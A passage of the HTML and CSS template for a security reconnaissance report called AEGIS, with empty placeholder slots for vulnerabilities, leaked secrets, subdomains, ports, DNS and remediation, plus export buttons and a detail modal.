/* ── STICKY TABS ─────────────────────────────────────── */
.tabs{display:flex;border-bottom:1px solid var(--b1);margin-bottom:1.75rem;overflow-x:auto;
  scrollbar-width:none;position:sticky;top:0;z-index:80;
  background:rgba(4,4,6,.96);backdrop-filter:blur(10px);padding-top:.4rem;gap:0}
.tabs::-webkit-scrollbar{display:none}
.tab-btn{font-family:var(--font-mono);font-size:.63rem;letter-spacing:.13em;text-transform:uppercase;
  padding:.82rem 1.3rem;background:transparent;border:none;border-bottom:2px solid transparent;
  color:var(--t3);cursor:pointer;transition:all .18s;margin-bottom:-1px;white-space:nowrap;
  display:flex;align-items:center;gap:.45rem}
.tab-btn:hover{color:var(--t1)}
.tab-btn.on{color:var(--cyan);border-bottom-color:var(--cyan)}
.tab-cnt{font-size:.5rem;padding:.06rem .38rem;border-radius:2px;
  background:rgba(0,210,255,.1);border:1px solid var(--b1);color:var(--cdim)}
.tab-btn.on .tab-cnt{background:rgba(0,210,255,.2);color:var(--cyan)}
.tab{display:none;animation:fadein .26s ease}
.tab.on{display:block}
@keyframes fadein{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}

/* ── PANEL ───────────────────────────────────────────── */
.panel{background:var(--card);border:1px solid var(--b1);border-radius:var(--r2);
  padding:1.5rem;margin-bottom:1rem;position:relative;overflow:hidden}
.phdr{display:flex;align-items:center;gap:.65rem;margin-bottom:1.1rem;
  padding-bottom:.85rem;border-bottom:1px solid var(--b1)}
.ptitle{font-family:var(--font-mono);font-size:.63rem;letter-spacing:.2em;text-transform:uppercase;
  color:var(--cyan);display:flex;align-items:center;gap:.45rem}
.ptitle::before{content:'//';color:var(--t3)}
.pacts{display:flex;gap:.45rem;margin-left:auto;align-items:center;flex-wrap:wrap}
.panel-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
.panel-grid .span2{grid-column:1/-1}
@media(max-width:700px){.panel-grid{grid-template-columns:1fr}}

/* ── FILTER ROW ───────────────────────────────────────── */
.frow{display:flex;gap:.5rem;flex-wrap:wrap;align-items:center;margin-bottom:.9rem}
.fi{background:var(--raised);border:1px solid var(--b1);color:var(--t1);
  font-family:var(--font-mono);font-size:.63rem;padding:.36rem .72rem;
  border-radius:var(--r);outline:none;transition:border-color .18s}
.fi:focus{border-color:var(--cyan)}
.fi::placeholder{color:var(--t3)}
select.fi option{background:var(--raised);color:var(--t1)}
.xbtn{font-family:var(--font-mono);font-size:.57rem;letter-spacing:.12em;text-transform:uppercase;
  padding:.35rem .78rem;background:transparent;border:1px solid var(--b1);color:var(--t2);
  border-radius:var(--r);cursor:pointer;transition:all .18s;white-space:nowrap}
.xbtn:hover{border-color:var(--cyan);color:var(--cyan);background:var(--cglow)}
.xbtn.danger:hover{border-color:var(--red);color:var(--red);background:var(--rglow)}
.tbl-count{font-family:var(--font-data);font-size:.6rem;color:var(--t3);white-space:nowrap}

/* ── TABLE ────────────────────────────────────────────── */
.tbl-wrap{overflow:auto;max-height:34rem;border-radius:var(--r);border:1px solid var(--b1)}
.tbl-wrap::-webkit-scrollbar{width:4px;height:4px}
.tbl-wrap::-webkit-scrollbar-track{background:var(--deep)}
.tbl-wrap::-webkit-scrollbar-thumb{background:var(--b2);border-radius:2px}
table.dt{width:100%;border-collapse:collapse;font-family:var(--font-data)}
table.dt thead{background:var(--deep);position:sticky;top:0;z-index:10}
table.dt th{font-family:var(--font-mono);font-size:.53rem;letter-spacing:.16em;text-transform:uppercase;
  color:var(--t3);padding:.6rem 1rem;text-align:left;border-bottom:1px solid var(--b1);
  white-space:nowrap;cursor:pointer;user-select:none;transition:color .15s}
table.dt th:hover{color:var(--cyan)}
table.dt th.sort-asc::after{content:' ▲';font-size:.48rem}
table.dt th.sort-desc::after{content:' ▼';font-size:.48rem}
table.dt td{font-size:.72rem;padding:.5rem 1rem;color:var(--t2);
  border-bottom:1px solid var(--b0);vertical-align:middle}
tr.xrow{cursor:pointer;transition:background .12s}
tr.xrow:hover{background:rgba(0,210,255,.04)}
tr.xrow:hover td{color:var(--t1)}
.no-data{font-family:var(--font-mono);font-size:.62rem;letter-spacing:.14em;
  color:var(--t3);text-align:center;padding:3rem 1rem}

/* ── BADGES ───────────────────────────────────────────── */
.badge{display:inline-block;padding:.08rem .48rem;border-radius:2px;
  font-family:var(--font-mono);font-size:.56rem;letter-spacing:.07em;white-space:nowrap}
.bc{color:#00d2ff;background:rgba(0,210,255,.11);border:1px solid rgba(0,210,255,.22)}
.bg{color:#00ff88;background:rgba(0,255,136,.11);border:1px solid rgba(0,255,136,.22)}
.br{color:#ff3366;background:rgba(255,51,102,.11);border:1px solid rgba(255,51,102,.22)}
.by{color:#ffaa00;background:rgba(255,170,0,.11);border:1px solid rgba(255,170,0,.22)}
.bp{color:#b060ff;background:rgba(176,96,255,.11);border:1px solid rgba(176,96,255,.22)}
.bo{color:#ff6633;background:rgba(255,102,51,.11);border:1px solid rgba(255,102,51,.22)}
.bd{color:var(--t3);background:rgba(255,255,255,.04);border:1px solid var(--b1)}
.cve-link{color:#ffaa44;background:rgba(255,170,68,.1);border:1px solid rgba(255,170,68,.25);
  text-decoration:none;font-size:.52rem;cursor:pointer}
.cve-link:hover{background:rgba(255,170,68,.22)}
.sev-critical{color:var(--red)}.sev-high{color:#ff6633}
.sev-medium{color:var(--amber)}.sev-low{color:var(--cyan)}.sev-info{color:var(--t3)}

/* ── CODE / PRE ───────────────────────────────────────── */
pre{font-family:var(--font-data);font-size:.72rem;line-height:1.75;max-height:24rem;overflow:auto;
  background:var(--deep);padding:1.1rem;border-radius:var(--r);border:1px solid var(--b1);
  color:var(--t2);white-space:pre-wrap;word-break:break-word}
pre::-webkit-scrollbar{width:4px;height:4px}
pre::-webkit-scrollbar-thumb{background:var(--b2);border-radius:2px}
code.inline{font-family:var(--font-data);font-size:.72rem;color:var(--amber);
  background:rgba(255,170,0,.08);padding:.05rem .35rem;border-radius:2px}

/* ── ML SCORE SECTION ─────────────────────────────────── */
.score-section{margin-bottom:1.75rem;padding:1.4rem 1.5rem;
  background:var(--surface);border:1px solid var(--b1);border-radius:var(--r2)}
.score-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(145px,1fr));gap:.85rem;margin-top:.85rem}
.score-item{display:flex;flex-direction:column;gap:.38rem}
.score-label{font-family:var(--font-mono);font-size:.52rem;letter-spacing:.18em;text-transform:uppercase;color:var(--t3)}
.score-val{font-family:var(--font-mono);font-size:1.55rem;color:var(--cyan)}
.score-bar-track{height:4px;background:rgba(0,210,255,.09);border-radius:2px;overflow:hidden}
.score-bar-fill{height:100%;border-radius:2px;background:linear-gradient(90deg,var(--cyan),var(--purple));
  transition:width 1.1s .2s ease;width:0}

/* ── CHARTS ───────────────────────────────────────────── */
.chart-2col{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:1rem}
.chart-3col{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;margin-bottom:1rem}
@media(max-width:900px){.chart-2col,.chart-3col{grid-template-columns:1fr 1fr}}
@media(max-width:560px){.chart-2col,.chart-3col{grid-template-columns:1fr}}
.chart-box{background:var(--card);border:1px solid var(--b1);border-radius:var(--r2);padding:1.2rem}
.chart-title{font-family:var(--font-mono);font-size:.55rem;letter-spacing:.18em;text-transform:uppercase;
  color:var(--t3);margin-bottom:.85rem;display:flex;align-items:center;gap:.4rem}
.chart-title::before{content:'//';color:var(--t4)}
.ch{height:240px;position:relative}
.ch-sm{height:190px;position:relative}

/* ── HEATMAP ──────────────────────────────────────────── */
.hm-wrap{overflow-x:auto;padding-bottom:.4rem}
.hm-grid{display:grid;gap:3px}
.hm-cell{width:14px;height:14px;border-radius:2px;cursor:pointer;position:relative;transition:transform .12s}
.hm-cell:hover{transform:scale(1.4);z-index:5}
.hm-cell[data-tip]:hover::after{content:attr(data-tip);position:absolute;left:50%;
  transform:translateX(-50%);bottom:calc(100% + 5px);background:var(--raised);
  border:1px solid var(--b2);color:var(--t1);font-family:var(--font-mono);font-size:.5rem;
  padding:.2rem .5rem;border-radius:2px;white-space:nowrap;z-index:100;pointer-events:none}
.hm-0{background:rgba(0,210,255,.05)}.hm-1{background:rgba(0,210,255,.28)}
.hm-2{background:rgba(0,210,255,.55)}.hm-3{background:rgba(255,170,0,.55)}
.hm-4{background:rgba(255,102,51,.6)}.hm-5{background:rgba(255,51,102,.7)}

/* ── MODAL ────────────────────────────────────────────── */
.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.82);z-index:9000;
  display:flex;align-items:center;justify-content:center;
  opacity:0;pointer-events:none;transition:opacity .2s}
.modal-bg.open{opacity:1;pointer-events:all}
.modal{background:var(--card);border:1px solid var(--b2);border-radius:var(--r2);
  box-shadow:var(--sh);width:min(840px,97vw);max-height:92vh;
  display:flex;flex-direction:column;overflow:hidden;
  transform:scale(.95) translateY(10px);transition:transform .22s}
.modal-bg.open .modal{transform:scale(1) translateY(0)}
.modal-hdr{display:flex;align-items:center;gap:.75rem;padding:1.1rem 1.4rem;
  border-bottom:1px solid var(--b1);flex-shrink:0;background:var(--raised)}
.modal-title{font-family:var(--font-mono);font-size:.78rem;letter-spacing:.14em;color:var(--cyan)}
.modal-body{overflow-y:auto;padding:1.4rem;flex:1}
.modal-body::-webkit-scrollbar{width:4px}
.modal-body::-webkit-scrollbar-thumb{background:var(--b2);border-radius:2px}
.modal-close{margin-left:auto;background:none;border:1px solid var(--b1);color:var(--t3);
  width:28px;height:28px;border-radius:var(--r);cursor:pointer;font-size:1rem;
  display:flex;align-items:center;justify-content:center;transition:all .15s;flex-shrink:0}
.modal-close:hover{border-color:var(--red);color:var(--red);background:var(--rglow)}
.msec{margin-bottom:1.35rem}
.msec-title{font-family:var(--font-mono);font-size:.55rem;letter-spacing:.2em;text-transform:uppercase;
  color:var(--t3);margin-bottom:.65rem;padding-bottom:.4rem;border-bottom:1px solid var(--b0);
  display:flex;align-items:center;gap:.4rem}
.msec-title::before{content:'//';color:var(--b2)}

/* ── KV GRID ──────────────────────────────────────────── */
.kv-grid{display:grid;grid-template-columns:140px 1fr;gap:.38rem .75rem}
.kv-k{font-family:var(--font-data);font-size:.63rem;color:var(--t3);padding-top:.12rem}
.kv-v{font-family:var(--font-data);font-size:.7rem;color:var(--t1);word-break:break-all;line-height:1.55}

/* ── REMEDIATION ──────────────────────────────────────── */
.rem-group{background:var(--raised);border:1px solid var(--b1);border-radius:var(--r2);
  overflow:hidden;margin-bottom:.85rem}
.rem-hdr{display:flex;align-items:center;gap:.65rem;padding:1rem 1.1rem;cursor:pointer;
  transition:background .15s}
.rem-hdr:hover{background:rgba(0,210,255,.04)}
.rem-sev{font-family:var(--font-mono);font-size:.55rem;letter-spacing:.1em;padding:.12rem .55rem;border-radius:2px}
.rem-arrow{font-size:.6rem;color:var(--t3);margin-left:auto;transition:transform .2s}
.rem-hdr.open .rem-arrow{transform:rotate(90deg)}
.rem-body{display:none;padding:0 1.1rem 1.1rem}
.rem-body.open{display:block}
.rem-steps{list-style:none;counter-reset:step;padding:0}
.rem-steps li{counter-increment:step;padding:.5rem 0 .5rem 2.2rem;position:relative;
  border-bottom:1px solid var(--b0);font-family:var(--font-data);font-size:.72rem;color:var(--t2);line-height:1.7}
.rem-steps li:last-child{border-bottom:none}
.rem-steps li::before{content:counter(step);position:absolute;left:0;top:.5rem;
  width:1.5rem;height:1.5rem;background:rgba(0,210,255,.12);border:1px solid var(--b2);
  border-radius:2px;font-family:var(--font-mono);font-size:.55rem;color:var(--cyan);
  display:flex;align-items:center;justify-content:center}
.rem-refs{font-family:var(--font-data);font-size:.62rem;color:var(--t3);margin-top:.65rem;
  padding:.5rem .75rem;background:var(--deep);border:1px solid var(--b1);border-radius:var(--r)}
.rem-refs a{color:var(--cyan);text-decoration:none}
.rem-refs a:hover{text-decoration:underline}

/* ── SSL / OSINT ──────────────────────────────────────── */
.sub-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
@media(max-width:640px){.sub-grid{grid-template-columns:1fr}}
.sub-title{font-family:var(--font-mono);font-size:.6rem;letter-spacing:.16em;text-transform:uppercase;color:var(--t2);margin-bottom:.6rem}
.kv-row{display:flex;align-items:flex-start;gap:.5rem;padding:.28rem 0;border-bottom:1px solid var(--b0)}
.kv-key{font-family:var(--font-data);font-size:.66rem;color:var(--t3);min-width:130px;flex-shrink:0}
.kv-val{font-family:var(--font-data);font-size:.7rem;color:var(--t1);word-break:break-all}
.pill-list{display:flex;flex-wrap:wrap;gap:.3rem;margin-top:.4rem}

/* ── GRAPH ────────────────────────────────────────────── */
#gc{height:530px;border:1px solid var(--b1);border-radius:var(--r2);background:var(--deep)}
.gcap{margin-top:.65rem;font-family:var(--font-mono);font-size:.6rem;letter-spacing:.12em;color:var(--t3)}

/* ── FOOTER ───────────────────────────────────────────── */
footer{margin-top:4rem;padding-top:1.5rem;border-top:1px solid var(--b1);text-align:center;
  font-family:var(--font-mono);font-size:.6rem;letter-spacing:.18em;text-transform:uppercase;color:var(--t3)}
footer span{color:rgba(0,210,255,.55)}

/* ── TOAST ────────────────────────────────────────────── */
#toast{position:fixed;bottom:1.5rem;right:1.5rem;background:var(--raised);border:1px solid var(--b2);
  color:var(--cyan);font-family:var(--font-mono);font-size:.65rem;padding:.55rem 1.1rem;
  border-radius:var(--r);z-index:9999;opacity:0;transition:opacity .28s;pointer-events:none;max-width:280px}
#toast.show{opacity:1}
canvas{border-radius:2px}
a{color:var(--cyan)}a:hover{color:var(--t0)}
.trend-up{color:var(--red)}.trend-dn{color:var(--green)}
</style>
</head>
<body>
<div class="wrap">

<!-- HEADER -->
<div class="hdr">
  <div class="logo">AEGIS</div>
  <div class="logo-sub">Advanced Exploitation &amp; Gathering Intelligence System &mdash; Recon Report</div>
  <div style="margin-top:1.25rem">
    <div class="meta-bar">
      <span>TARGET</span><span class="tbadge">@@TARGET@@</span>
      <span class="sep">&#x2502;</span><span>@@GENERATED@@</span>
      <span class="sep">&#x2502;</span><span>v@@VERSION@@</span>
      <span class="sep">&#x2502;</span><span>&#9201;&nbsp;@@STAT_DURATION@@s</span>
      <span class="risk-pill risk-@@RISK@@">@@RISK@@</span>
    </div>
  </div>
  <div class="hdr-actions no-print">
    <button class="hdr-btn primary" onclick="exportReport()">&#8681; Full JSON</button>
    <button class="hdr-btn" onclick="exportVulnsCSV()">&#8681; Vuln CSV</button>
    <button class="hdr-btn" onclick="exportVulnsJSON()">&#8681; Vuln JSON</button>
    <button class="hdr-btn" onclick="exportLeaksCSV()">&#8681; Leaks CSV</button>
    <button class="hdr-btn" onclick="exportURLsCSV()">&#8681; URLs CSV</button>
    <button class="hdr-btn" onclick="window.print()">&#128438; Print PDF</button>
    <button class="hdr-btn" onclick="copyText('@@TARGET@@')">&#8982; Copy Target</button>
  </div>
</div>

@@SCORES_SECTION@@

<!-- STAT CARDS -->
<div class="stats">
  <div class="scard" style="--ac:var(--cyan);--ag:var(--cglow)">
    <div class="slbl">Crawled URLs</div>
    <div class="sval" id="cnt-urls">@@STAT_URLS@@</div>
    <div class="ssub">@@STAT_FORMS@@ forms &bull; @@STAT_NODES@@ graph nodes</div>
    <div class="sico">&#127760;</div>
  </div>
  <div class="scard" style="--ac:var(--red);--ag:var(--rglow)">
    <div class="slbl">Vulnerabilities</div>
    <div class="sval" id="cnt-vulns">@@STAT_VULNS@@</div>
    <div class="ssub">@@STAT_CRIT@@ critical+high &bull; @@STAT_CVES@@ CVEs</div>
    <div class="sico">&#9889;</div>
  </div>
  <div class="scard" style="--ac:var(--amber);--ag:var(--aglow)">
    <div class="slbl">Data Leaks</div>
    <div class="sval" id="cnt-leaks">@@STAT_LEAKS@@</div>
    <div class="ssub">secrets &amp; credentials</div>
    <div class="sico">&#128273;</div>
  </div>
  <div class="scard" style="--ac:var(--purple);--ag:var(--pglow)">
    <div class="slbl">Subdomains</div>
    <div class="sval" id="cnt-subs">@@STAT_SUBS@@</div>
    <div class="ssub">@@STAT_ALIVE@@ alive</div>
    <div class="sico">&#127807;</div>
  </div>
  <div class="scard" style="--ac:var(--green);--ag:var(--gglow)">
    <div class="slbl">Open Ports</div>
    <div class="sval" id="cnt-ports">@@STAT_PORTS@@</div>
    <div class="ssub">@@STAT_RISKY@@ high-risk services</div>
    <div class="sico">&#128268;</div>
  </div>
  <div class="scard" style="--ac:var(--cyan);--ag:var(--cglow)">
    <div class="slbl">Technologies</div>
    <div class="sval" id="cnt-tech">@@STAT_TECH@@</div>
    <div class="ssub">fingerprinted</div>
    <div class="sico">&#128736;</div>
  </div>
  <div class="scard" style="--ac:var(--green);--ag:var(--gglow)">
    <div class="slbl">DNS Records</div>
    <div class="sval" id="cnt-dns">@@STAT_DNS@@</div>
    <div class="ssub">record types enumerated</div>
    <div class="sico">&#128225;</div>
  </div>
  <div class="scard" style="--ac:var(--red);--ag:var(--rglow)">
    <div class="slbl">CVE References</div>
    <div class="sval" id="cnt-cves">@@STAT_CVES@@</div>
    <div class="ssub">linked identifiers</div>
    <div class="sico">&#128128;</div>
  </div>
</div>

<!-- TABS -->
<div class="tabs no-print">
  <button class="tab-btn on"  data-t="overview">Overview</button>
  <button class="tab-btn" data-t="vulns">Vulns <span class="tab-cnt">@@STAT_VULNS@@</span></button>
  <button class="tab-btn" data-t="urls">URLs <span class="tab-cnt">@@STAT_URLS@@</span></button>
  <button class="tab-btn" data-t="leaks">Leaks <span class="tab-cnt">@@STAT_LEAKS@@</span></button>
  <button class="tab-btn" data-t="subdomains">Subdomains <span class="tab-cnt">@@STAT_SUBS@@</span></button>
  <button class="tab-btn" data-t="ports">Ports <span class="tab-cnt">@@STAT_PORTS@@</span></button>
  <button class="tab-btn" data-t="dns">DNS <span class="tab-cnt">@@STAT_DNS@@</span></button>
  <button class="tab-btn" data-t="ssl">SSL/TLS</button>
  <button class="tab-btn" data-t="graph">Link Graph</button>
  <button class="tab-btn" data-t="remediation">Remediation</button>
  <button class="tab-btn" data-t="osint">OSINT</button>
  <button class="tab-btn" data-t="tech">Technologies</button>
</div>

<!-- TAB: OVERVIEW -->
<div id="overview" class="tab on">

  <div class="panel">
    <div class="phdr"><div class="ptitle">Vulnerability Risk Heatmap</div>
      <div class="pacts" style="gap:.75rem">
        <div style="display:flex;gap:3px;align-items:center">
          <div class="hm-cell hm-0" style="cursor:default"></div>
          <div class="hm-cell hm-1" style="cursor:default"></div>
          <div class="hm-cell hm-2" style="cursor:default"></div>
          <div class="hm-cell hm-3" style="cursor:default"></div>
          <div class="hm-cell hm-4" style="cursor:default"></div>
          <div class="hm-cell hm-5" style="cursor:default"></div>
        </div>
        <span style="font-family:var(--font-data);font-size:.6rem;color:var(--t3)">Clean &#8594; Info &#8594; Low &#8594; Med &#8594; High &#8594; Critical</span>
      </div>
    </div>
    <div class="hm-wrap"><div id="heatmap" class="hm-grid"></div></div>
    <div style="font-family:var(--font-data);font-size:.6rem;color:var(--t3);margin-top:.6rem">
      Each cell = one crawled URL. Hover for details. Click to copy URL.
    </div>
  </div>

  <div class="chart-2col">
    <div class="chart-box">
      <div class="chart-title">Severity Distribution</div>
      <div class="ch"><canvas id="chart-sev"></canvas></div>
    </div>
    <div class="chart-box">
      <div class="chart-title">Vulnerability Types (Top 12)</div>
      <div class="ch"><canvas id="chart-type"></canvas></div>
    </div>
  </div>

  <div class="chart-2col">
    <div class="chart-box">
      <div class="chart-title">HTTP Status Distribution</div>
      <div class="ch"><canvas id="chart-status"></canvas></div>
    </div>
    <div class="chart-box">
      <div class="chart-title">Data Leak Categories</div>
      <div class="ch"><canvas id="chart-leaks"></canvas></div>
    </div>
  </div>

  <div class="chart-3col">
    <div class="chart-box">
      <div class="chart-title">Open Ports</div>
      <div class="ch-sm"><canvas id="chart-ports"></canvas></div>
    </div>
    <div class="chart-box">
      <div class="chart-title">Detection Confidence</div>
      <div class="ch-sm"><canvas id="chart-conf"></canvas></div>
    </div>
    <div class="chart-box">
      <div class="chart-title">Technology Stack</div>
      <div class="ch-sm"><canvas id="chart-tech"></canvas></div>
    </div>
  </div>

  <div class="panel">
    <div class="phdr">
      <div class="ptitle">Critical &amp; High Severity Findings</div>
      <div class="pacts"><button class="xbtn" onclick="switchTab('vulns')">All Vulns &#8594;</button></div>
    </div>
    <div class="tbl-wrap">
      <table class="dt">
        <thead><tr>
          <th>Sev</th><th>Type</th><th>CVE</th><th>CVSS</th>
          <th>URL</th><th>Parameter</th>
        </tr></thead>
        <tbody id="crit-tbody">@@CRIT_ROWS@@</tbody>
      </table>
    </div>
  </div>
</div>

<!-- TAB: VULNS -->
<div id="vulns" class="tab">
  <div class="panel">
    <div class="phdr">
      <div class="ptitle">All Vulnerabilities</div>
      <div class="pacts">
        <button class="xbtn" onclick="exportVulnsCSV()">&#8681; CSV</button>
        <button class="xbtn" onclick="exportVulnsJSON()">&#8681; JSON</button>
      </div>
    </div>
    <div class="frow">
      <input class="fi" id="vq" type="text" placeholder="Search type, URL, param, CVE&#8230;" style="width:230px">
      <select class="fi" id="vsev">
        <option value="">All severities</option>
        <option>CRITICAL</option><option>HIGH</option><option>MEDIUM</option><option>LOW</option><option>INFO</option>
      </select>
      <select class="fi" id="vconf">
        <option value="">All confidence</option>
        <option value="confirmed">Confirmed</option><option value="likely">Likely</option><option value="possible">Possible</option>
      </select>
      <select class="fi" id="vtype">
        <option value="">All types</option>@@VULN_TYPE_OPTIONS@@
      </select>
      <span id="vcount" class="tbl-count"></span>
    </div>
    <div class="tbl-wrap">
      <table class="dt" id="vtbl">
        <thead><tr>
          <th onclick="sortTbl('vtbl',0)">Severity</th>
          <th onclick="sortTbl('vtbl',1)">Type</th>
          <th onclick="sortTbl('vtbl',2)">Confidence</th>
          <th onclick="sortTbl('vtbl',3)">CVE</th>
          <th onclick="sortTbl('vtbl',4)">CVSS</th>
          <th onclick="sortTbl('vtbl',5)">URL</th>
          <th onclick="sortTbl('vtbl',6)">Parameter</th>
          <th>&#8505;</th>
        </tr></thead>
        <tbody id="vtbody">@@VULN_ROWS@@</tbody>
      </table>
    </div>
    <div id="vcount2" class="tbl-count" style="margin-top:.5rem"></div>
  </div>
</div>

<!-- TAB: URLS -->
<div id="urls" class="tab">
  <div class="panel">
    <div class="phdr">
      <div class="ptitle">Discovered URLs</div>
      <div class="pacts"><button class="xbtn" onclick="exportURLsCSV()">&#8681; CSV</button></div>
    </div>
    <div class="frow">
      <input class="fi" id="urlq" type="text" placeholder="Filter URLs, titles&#8230;" style="width:270px">
      <select class="fi" id="urlst">
        <option value="">All statuses</option>
        <option>200</option><option>301</option><option>302</option>
        <option>403</option><option>404</option><option>500</option>
      </select>
      <span id="urlcount" class="tbl-count"></span>
    </div>
    <div class="tbl-wrap">
      <table class="dt" id="utbl">
        <thead><tr>
          <th onclick="sortTbl('utbl',0)">URL</th>
          <th onclick="sortTbl('utbl',1)">Status</th>
          <th onclick="sortTbl('utbl',2)">Size</th>
          <th onclick="sortTbl('utbl',3)">Title</th>
          <th onclick="sortTbl('utbl',4)">Forms</th>
          <th>Content-Type</th>
        </tr></thead>
        <tbody id="utbody">@@URL_ROWS@@</tbody>
      </table>
    </div>
  </div>
</div>

<!-- TAB: LEAKS -->
<div id="leaks" class="tab">
  <div class="panel">
    <div class="phdr">
      <div class="ptitle">Extracted Secrets &amp; PII</div>
      <div class="pacts"><button class="xbtn" onclick="exportLeaksCSV()">&#8681; CSV</button></div>
    </div>
    <div class="frow">
      <input class="fi" id="lkq" type="text" placeholder="Search value, URL, category&#8230;" style="width:230px">
      <select class="fi" id="lksev">
        <option value="">All severities</option>
        <option>CRITICAL</option><option>HIGH</option><option>MEDIUM</option><option>LOW</option>
      </select>
      <select class="fi" id="lkcat">
        <option value="">All categories</option>@@LEAK_CAT_OPTIONS@@
      </select>
      <span id="lkcount" class="tbl-count"></span>
    </div>
    <div class="tbl-wrap">
      <table class="dt">
        <thead><tr>
          <th>Category</th><th>Severity</th><th>Value</th><th>Key</th>
          <th>Source URL</th><th>Context</th>
        </tr></thead>
        <tbody id="lkbody">@@LEAK_ROWS@@</tbody>
      </table>
    </div>
  </div>
</div>

<!-- TAB: SUBDOMAINS -->
<div id="subdomains" class="tab">
  <div class="panel">
    <div class="phdr">
      <div class="ptitle">Subdomain Enumeration</div>
      <div class="pacts"><button class="xbtn" onclick="exportSubsCSV()">&#8681; CSV</button></div>
    </div>
    <div class="frow">
      <input class="fi" id="sbq" type="text" placeholder="Filter subdomain, IP&#8230;" style="width:230px">
      <select class="fi" id="sbalive">
        <option value="">All</option>
        <option value="ALIVE">Alive only</option>
        <option value="DEAD">Dead only</option>
      </select>
      <span id="sbcount" class="tbl-count"></span>
    </div>
    <div class="tbl-wrap">
      <table class="dt" id="sbtbl">
        <thead><tr>
          <th onclick="sortTbl('sbtbl',0)">Subdomain</th>
          <th>IPs</th><th>Status</th><th>Alive</th>
          <th>Technologies</th><th>CNAMEs</th><th>Source</th>
        </tr></thead>
        <tbody id="sbbody">@@SUBDOMAIN_ROWS@@</tbody>
      </table>
    </div>
  </div>
</div>

<!-- TAB: PORTS -->
<div id="ports" class="tab">
  <div class="panel">
    <div class="phdr"><div class="ptitle">Port Scan Results</div></div>
    <div class="frow">
      <input class="fi" id="ptq" type="text" placeholder="Filter port, service, banner&#8230;" style="width:210px">
      <select class="fi" id="ptstate">
        <option value="">All states</option>
        <option value="open">Open</option><option value="closed">Closed</option><option value="filtered">Filtered</option>
      </select>
      <label style="display:flex;align-items:center;gap:.4rem;font-family:var(--font-mono);font-size:.62rem;color:var(--t2);cursor:pointer">
        <input type="checkbox" id="ptrisky" style="accent-color:var(--red)"> High-risk only
      </label>
      <span id="ptcount" class="tbl-count"></span>
    </div>
    <div class="tbl-wrap">
      <table class="dt" id="pttbl">
        <thead><tr>
          <th onclick="sortTbl('pttbl',0)">Port</th>
          <th onclick="sortTbl('pttbl',1)">State</th>
          <th onclick="sortTbl('pttbl',2)">Service</th>
          <th onclick="sortTbl('pttbl',3)">Version</th>
          <th>Banner</th><th>Risk</th>
        </tr></thead>
        <tbody id="ptbody">@@PORT_ROWS@@</tbody>
      </table>
    </div>
  </div>
</div>

<!-- TAB: DNS -->
<div id="dns" class="tab">
  <div class="panel">
    <div class="phdr"><div class="ptitle">DNS Records</div></div>
    <div class="frow">
      <input class="fi" id="dnq" type="text" placeholder="Filter name, value&#8230;" style="width:210px">
      <select class="fi" id="dnttype">
        <option value="">All types</option>
        <option>A</option><option>AAAA</option><option>MX</option>
        <option>NS</option><option>TXT</option><option>CNAME</option>
        <option>SOA</option><option>AXFR</option>
      </select>
      <span id="dncount" class="tbl-count"></span>
    </div>
    <div class="tbl-wrap">
      <table class="dt" id="dntbl">
        <thead><tr>
          <th onclick="sortTbl('dntbl',0)">Type</th>
          <th onclick="sortTbl('dntbl',1)">Name</th>
          <th>Value</th>
          <th onclick="sortTbl('dntbl',3)">TTL</th>
        </tr></thead>
        <tbody id="dnbody">@@DNS_ROWS@@</tbody>
      </table>
    </div>
  </div>
  @@DNS_ISSUES@@
</div>

<!-- TAB: SSL -->
<div id="ssl" class="tab">@@SSL_SECTION@@</div>

<!-- TAB: GRAPH -->
<div id="graph" class="tab">
  <div class="panel">
    <div class="phdr">
      <div class="ptitle">Site Link Graph</div>
      <div class="pacts">
        <button class="xbtn" onclick="if(window._vn)window._vn.fit()">&#8617; Reset View</button>
      </div>
    </div>
    <div id="gc"></div>
    <p class="gcap">// @@STAT_NODES@@ nodes &middot; @@STAT_EDGES@@ edges &middot; Drag to pan &middot; Scroll to zoom &middot; Click node copies URL</p>
  </div>
</div>

<!-- TAB: REMEDIATION -->
<div id="remediation" class="tab">@@REMEDIATION_SECTION@@</div>

<!-- TAB: OSINT -->
<div id="osint" class="tab">@@OSINT_SECTION@@</div>

<!-- TAB: TECH -->
<div id="tech" class="tab">
  <div class="panel">
    <div class="phdr"><div class="ptitle">Detected Technologies</div></div>
    <div class="frow">
      <input class="fi" id="tq" type="text" placeholder="Filter name, category&#8230;" style="width:220px">
    </div>
    <div class="tbl-wrap">
      <table class="dt" id="ttbl">
        <thead><tr>
          <th onclick="sortTbl('ttbl',0)">Technology</th>
          <th onclick="sortTbl('ttbl',1)">Version</th>
          <th onclick="sortTbl('ttbl',2)">Category</th>
          <th onclick="sortTbl('ttbl',3)">Confidence</th>
        </tr></thead>
        <tbody id="tbody">@@TECH_ROWS@@</tbody>
      </table>
    </div>
  </div>
</div>

<footer>Generated by <span>AEGIS v@@VERSION@@</span> &mdash; <span>@@GENERATED@@</span> &mdash; Target: <span>@@TARGET@@</span></footer>
</div>

<!-- VULN DETAIL MODAL -->
<div class="modal-bg no-print" id="modal">
  <div class="modal">
    <div class="modal-hdr">
      <div class="modal-title" id="m-title">Vulnerability Detail</div>
      <span id="m-sev" class="badge" style="margin-left:.5rem"></span>
      <span id="m-conf" class="badge" style="margin-left:.3rem"></span>
      <button class="modal-close" onclick="closeModal()">&#10005;</button>
    </div>
    <div class="modal-body">
      <div class="msec">
        <div class="msec-title">Identification</div>
        <div class="kv-grid" id="m-kv"></div>
      </div>
      <div class="msec">
        <div class="msec-title">Evidence &amp; Payload</div>
        <pre id="m-evidence" style="font-size:.7rem"></pre>
      </div>
      <div class="msec">
        <div class="msec-title">Remediation</div>
        <div id="m-rem" style="font-family:var(--font-data);font-size:.72rem;color:var(--t2);line-height:1.75;
          background:var(--deep);border:1px solid var(--b1);border-radius:var(--r);padding:1rem"></div>
      </div>
      <div class="msec">
        <div class="msec-title">References</div>
        <div id="m-refs" style="font-family:var(--font-data);font-size:.68rem;color:var(--t3);line-height:1.95"></div>
      </div>
    </div>
  </div>
</div>

<!-- EMBEDDED JSON DATA -->
<script>
const _V=@@VULNS_JSON@@;
const _U=@@URLS_JSON@@;
const _L=@@LEAKS_JSON@@;
